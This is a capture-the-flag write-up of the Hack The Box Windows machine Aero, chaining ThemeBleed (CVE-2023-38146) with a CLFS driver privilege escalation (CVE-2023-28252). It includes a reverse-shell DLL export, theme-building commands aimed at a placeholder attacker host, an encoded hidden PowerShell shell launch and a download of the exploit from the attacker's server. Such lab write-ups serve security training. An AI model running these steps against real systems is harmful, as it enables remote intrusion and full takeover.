---
title: "Aero — ThemeBleed and CLFS Privilege Escalation"
description: "A malicious Windows theme upload on the ThemeBleed path yields a shell, then CLFS abuse escalates to SYSTEM."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - cve-2023-38146
  - cve-2023-28252
  - themebleed
  - privilege-escalation
---

## Summary

Aero is a Medium Windows machine built around two public vulnerabilities. Initial access abuses CVE-2023-38146 (ThemeBleed) through a malicious Windows theme upload to obtain a shell as `<LAB_USER>`. Privilege escalation then leverages CVE-2023-28252, a Windows Common Log File System (CLFS) local privilege escalation vulnerability, to reach SYSTEM.

All target and operator IP addresses in this article are replaced with role-based placeholders. The source notes reference a single HTB target environment; no real-world infrastructure is implicated.

## Context and Objective

The engagement targets a Windows 11 machine (IP: `<TARGET_IP>`) exposing only HTTP on port 80. The web application is a Windows theme sharing portal with an upload feature. The objective is to obtain user and root flags by exploiting the theme processing workflow and escalating privileges locally.

## Approach and Evidence

### Stage 1 — Port Scanning and Service Discovery

The notes record an initial port scan to identify exposed services.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Aero-TCP
```

Truncated output confirming only HTTP:

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

The recorded output shows only port 80/tcp open, running Microsoft IIS 10.0 with the title "Aero Theme Hub." The web application context directly maps to CVE-2023-38146, where a crafted Windows theme file can reference attacker-controlled resources and trigger code execution.

### Stage 2 — ThemeBleed Exploitation (CVE-2023-38146)

The ThemeBleed proof of concept requires a payload DLL exporting a function named `VerifyThemeVersion`. The notes document building such a DLL as x64 Release and staging it for the PoC tooling.

```cpp
extern "C" __declspec(dllexport) int VerifyThemeVersion(void)
{
    rev_shell();
    return 0;
}
```

The payload DLL is renamed to the expected staging filename and placed in the PoC's data directory. A malicious theme file is generated using the ThemeBleed tool:

```powershell
.\ThemeBleed.exe make_theme <ATTACKER_IP> aero.theme
.\ThemeBleed.exe server
```

The generated theme is uploaded through the web application. When the target processes the theme, the PoC serves the staged content and the DLL callback executes, returning a reverse shell:

```
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 3 - LoadLibrary

connect to <ATTACKER_IP> from (UNKNOWN) [<TARGET_IP>]
C:\Windows\system32>whoami
<LAB_USER>
```

The recorded output confirms a shell as `<LAB_USER>`.

### Stage 3 — Local Enumeration and Privesc Hint

After gaining a shell, the notes record searching the user profile for interesting files:

```powershell
Get-ChildItem "$env:USERPROFILE" -Recurse -File -Exclude desktop.ini
```

The key finding is a PDF named `CVE-2023-28252_Summary.pdf` in the user's Documents folder. The filename serves as the intended privilege escalation hint, pointing directly to a known CLFS driver vulnerability.

### Stage 4 — CLFS Privilege Escalation (CVE-2023-28252)

CVE-2023-28252 affects the Windows Common Log File System driver. The notes document modifying a working PoC to launch a reverse shell instead of a benign process when running as SYSTEM:

```cpp
if (strcmp(username, "SYSTEM") == 0) {
    system("powershell -nop -w hidden -e <BASE64_SHELL>");
}
```

The modified exploit is built as x64 Release, hosted on the attacker's HTTP server, and downloaded to the target:

```powershell
iwr http://<ATTACKER_IP>:8000/clfs_eop.exe -OutFile clfs_eop.exe
```

Executing the exploit captures the SYSTEM token:

```
ACTUAL USER=SYSTEM

PS C:\Users\<LAB_USER>\Documents> whoami
nt authority\system
```

The recorded output confirms successful escalation to `nt authority\system`.

## Outcome

The notes report a complete attack chain from initial web access to SYSTEM through two documented CVEs: ThemeBleed for initial access via malicious theme upload, and CLFS driver exploitation for local privilege escalation. The notes report that both user and root flags were obtained; no flag capture output is recorded in the source.

## Lessons and Recommendations

- Theme file upload functionality can be dangerous when the target host processes uploaded content rather than treating it as inert data. Input validation should reject or sandbox files that trigger executable processing.
- CVE-2023-38146 requires specific payload preparation — the DLL export name and staging flow are integral to exploitation, not trivial one-line exploits.
- Post-exploitation file names and internal patch notes are high-value enumeration targets on CTF-style Windows machines. Users should be aware that filenames can leak system vulnerability information.
- CVE-2023-28252 demonstrates that the CLFS driver vulnerability provided a local privilege escalation path from standard user to SYSTEM in this lab. Timely patching of Windows kernel-mode drivers is critical.

## References

- HTB Machine: [Aero](https://app.hackthebox.com/machines/Aero)
- CVE-2023-38146 — Windows Theme File Remote Code Execution (ThemeBleed)
- CVE-2023-28252 — Windows Common Log File System Driver Elevation of Privilege
